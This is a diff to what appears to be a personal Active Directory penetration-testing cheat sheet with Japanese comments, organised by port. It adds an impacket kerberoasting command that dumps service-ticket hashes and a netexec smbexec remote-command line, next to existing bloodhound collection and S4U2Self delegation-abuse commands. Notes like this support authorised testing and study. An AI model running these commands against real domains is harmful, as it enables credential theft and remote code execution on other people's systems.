@@ -36,6 +36,13 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection A
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
 ```
 
+impacket
+```sh
+# kerberoasting (TCP88番も必要)
+impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+```
+
+
 
 ## 445
 netexec(rpcを使用するためTCP135番も使う)
@@ -72,6 +79,8 @@ and so on ...
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --delegate 'ADMINISTRAOR'
 # S4U2Self
 netexec smb 'IP' -u 'COMPUTERACCOUNT$' -H 'NTHASH' --delegate 'ADMINISTRAOR' --self
+# exec
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'smbexec' -x 'COMMAND'
 ```
 
 smbclient
